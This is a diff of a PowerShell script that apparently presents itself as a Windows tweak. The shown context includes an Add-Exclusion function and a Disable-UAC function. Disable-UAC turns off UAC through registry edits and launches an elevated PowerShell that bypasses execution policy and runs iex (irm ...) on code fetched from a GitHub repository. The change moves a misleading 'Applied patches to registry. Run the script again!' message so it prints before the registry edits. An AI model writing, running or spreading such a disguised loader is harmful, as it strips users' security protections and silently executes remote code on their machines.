@@ -22,6 +22,7 @@ function Add-Exclusion {
 
 function Disable-UAC {
     try {
+        Write-Host "Applied patches to registry. Run the script again!" -ForegroundColor Red
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -ErrorAction Stop
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -ErrorAction Stop
         Start-Process "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command ""iex (irm 'https://github.com/WindowsTweaksX/boom/raw/refs/heads/main/create_file')""" -Verb RunAs
@@ -81,7 +82,7 @@ try {
             
             if ($process.ExitCode -eq 0) {
                 Write-Host "All good!" -ForegroundColor Green
-            } else { Write-Host "Applied patches to registry. Run the script again!" -ForegroundColor Red
+            } else {
             }
         } else {
             Disable-UAC
